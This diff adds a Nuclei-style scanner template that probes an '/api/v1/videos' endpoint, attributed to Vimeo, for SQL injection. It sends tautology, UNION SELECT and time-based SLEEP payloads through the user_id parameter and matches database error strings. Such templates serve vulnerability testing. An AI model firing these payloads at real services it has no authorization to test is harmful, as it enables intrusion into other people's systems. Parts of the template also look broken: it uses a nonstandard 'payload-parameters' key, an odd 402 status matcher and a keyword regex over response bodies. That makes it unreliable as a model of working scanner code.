@@ -1,0 +1,33 @@
+id: custom-sqli-vimeo-video-endpoint
+info:
+  name: Vimeo Video API SQL Injection Vulnerability
+  author: whitehat-ai
+  severity: critical
+  description: Tests for SQL injection vulnerabilities in Vimeo's video API endpoint through user_id parameter manipulation.
+  tags: sqli,sql-injection,vimeo-api
+
+http:
+  - method: GET
+    path: "/api/v1/videos"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words: ["error", "syntax", "mysql", "mssql", "sqlite"]
+        part: body
+      - type: status
+        status: [500, 402]
+      - type: regex
+        regex: 
+          - "(?i)(union|select|from|where|insert|delete|drop)"
+    extractors:
+      - name: sql-error-pattern
+        type: regex
+        part: body
+        regex:
+          - "(?i)(error in your SQL syntax near '.*' at line \\d+)"
+    payload-parameters:
+      user_id:
+        payloads:
+          - "' OR '1'='1"
+          - "1 UNION SELECT NULL--"
+          - "' AND SLEEP(5)--"
